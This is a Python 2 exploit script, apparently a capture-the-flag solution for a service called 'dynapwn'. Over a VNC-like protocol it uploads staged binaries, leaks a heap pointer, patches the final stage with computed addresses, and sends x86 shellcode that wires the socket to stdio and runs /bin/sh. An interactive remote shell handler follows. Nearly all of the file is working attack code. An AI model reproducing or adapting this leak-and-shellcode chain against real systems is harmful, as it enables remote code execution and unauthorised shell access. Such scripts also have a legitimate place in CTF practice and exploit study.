import sys, os
import socket
import time
import binascii
import struct
import time
import zlib

global sock

def SendKey(CharToSend):
	Data = "\x04\x01\x00\x00\x00\x00\x00" + CharToSend
	return Data

def SendStr(cmd):
	global sock
	for c in cmd + "\x0d":
		sock.send(SendKey(c))
		time.sleep(1)
	return

def RFBInit():
	global sock
	RFBVersion = sock.recv(12)
	sock.send(RFBVersion)

	sock.recv(2)
	sock.send("\x01\x01")

	sock.recv(31)
	return

def SetPixelFormat():
	global sock
	#8 bits per pixel with proper rgb so bytes are unmodified
	sock.send("\x00\x00\x00\x00\x08\x00\x00\x00\x00\x07\x00\x07\x00\x03\x00\x03\x06\x00\x00\x00")
	return

def SendFile(data):
	global sock

	data = zlib.compress(data)

	sock.send("\x06\x00\x00\x00")
	sock.send(struct.pack(">I", len(data)))
	sock.send(data)
	return

def main():
	global sock

	print "Exploit for dynapwn"
 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((sys.argv[1], 4546))

	RFBInit()

	SetPixelFormat()

	SendStr("BootMeUp!!!")

	print "Uploading stage1"
	SendStr("upload")

	SendFile(open("stage1.bin", "r").read())

	time.sleep(1)

	sock.send("\x03" + "\x00"*9)
	time.sleep(0.5)
	Data = sock.recv(10000)

	DecompLen = struct.unpack(">I", Data[16:20])[0]
	DecompObj = zlib.decompressobj()
	DecompData = DecompObj.decompress(Data[20:DecompLen+20])

	MemPtrHigh = struct.unpack("<H", DecompData[0:2])[0] << 16
	#print "Partial memory pointer located: %08x" % (MemPtr)

	print "Uploading stage2"
	SendFile(open("stage2.bin", "r").read())

	time.sleep(1)

	sock.send("\x03" + "\x00"*9)
	time.sleep(0.5)
	Data = sock.recv(10000)

	DecompLen = struct.unpack(">I", Data[16:20])[0]
	DecompData = DecompObj.decompress(Data[20:DecompLen+20])

	MemPtrLow = struct.unpack("<H", DecompData[0:2])[0]
	MemPtr = (MemPtrHigh | (MemPtrLow & 0xFF00)) - 0x20200
	print "Beginning of memory allocation: %08x" % (MemPtr)

	FinalOverwrite = MemPtr + (0xffff*2) + 0x120

	if(((FinalOverwrite & 0xffff0000) != MemPtrHigh) or (((FinalOverwrite - 1) & 0xffff0000) != MemPtrHigh)):
		print "overwrite location too far away, try running again"

	#address of readAll in the binary
	readAll = 0x3b70

	#location of the file descriptor in the binary
	fd  = 0xf368

	#the location that the dyna code normally returns to
	retpos = 0x8bc9

	stage3 = open("stage3.bin","r").read()

	fd = (fd - retpos) & 0xffffffff
	readAll = (readAll - retpos) & 0xffffffff

	#fill in the address to write to
	stage3 = stage3[0:0x2f5] + struct.pack("<B", fd & 0xff) + stage3[0x2f6:]
	stage3 = stage3[0:0x2f8] + struct.pack("<H", (fd >> 8) & 0xffff) + stage3[0x2fa:]
	stage3 = stage3[0:0x2fc] + struct.pack("<B", (fd >> 24) & 0xff) + stage3[0x2fd:]

	#fill in fd
	WriteAddress = FinalOverwrite + 30
	stage3 = stage3[0:0x309] + struct.pack("<B", WriteAddress & 0xff) + stage3[0x30a:]
	stage3 = stage3[0:0x30c] + struct.pack("<H", (WriteAddress >> 8) & 0xffff) + stage3[0x30e:]
	stage3 = stage3[0:0x310] + struct.pack("<B", (WriteAddress >> 24) & 0xff) + stage3[0x311:]

	#fill in the readAll
	stage3 = stage3[0:0x318] + struct.pack("<H", readAll & 0xffff) + stage3[0x31a:]
	stage3 = stage3[0:0x31c] + struct.pack("<H", (readAll >> 16) & 0xffff) + stage3[0x31e:]

	#fill in the offset, sub one due to the stage adding 1
	stage3 = stage3[0:0x324] + struct.pack("<H", (FinalOverwrite - 1) & 0xffff) + stage3[0x326:]

	ShellFDOffset = (fd - readAll) & 0xffffffff

	#fill in the size
	shell = "\x81\xc3" + struct.pack("<I", ShellFDOffset) + "\x0f\xb7\x1b\x53"
	shell = shell + "SVWU\x8b\xec\x8dd$\xf8\xe8\x00\x00\x00\x00_\x8d\x7f\xf13\xf6\x83\xfe\x03|\x02\xeb\x11j?X\x8b]\x14\x8b\xce\xcd\x80\x8b\xc6\x83\xc6\x01\xeb\xe8\x8dGL\x89E\xf8j\x00\x8fE\xfc\x8bU\xf8\x8dM\xf8j\x0bX\x8b\xda3\xd2\xcd\x80\xc9_^[\xc3/bin/sh\x00"
	stage3 = stage3[0:0x300] + struct.pack("<H", len(shell)) + stage3[0x302:]

	SendFile(stage3)

	time.sleep(0.5)
	sock.send(shell)

	print "Incoming shell"

	# Awesome Shell shamelessly stolen from Eindbazen
	# connect stdio to socket until either EOF's. use low-level calls to bypass stdin buffering.
	# also change the tty to character mode so we can have line editing and tab completion.
	import termios, tty, select, os
	old_settings = termios.tcgetattr(0)
	try:
	    tty.setcbreak(0)
	    c = True
	    while c:
	        for i in select.select([0, sock.fileno()], [], [], 0)[0]:
	            c = os.read(i, 1024)
	            if c: os.write(sock.fileno() if i == 0 else 1, c)
	except KeyboardInterrupt: pass
	finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

	sock.close()

main()

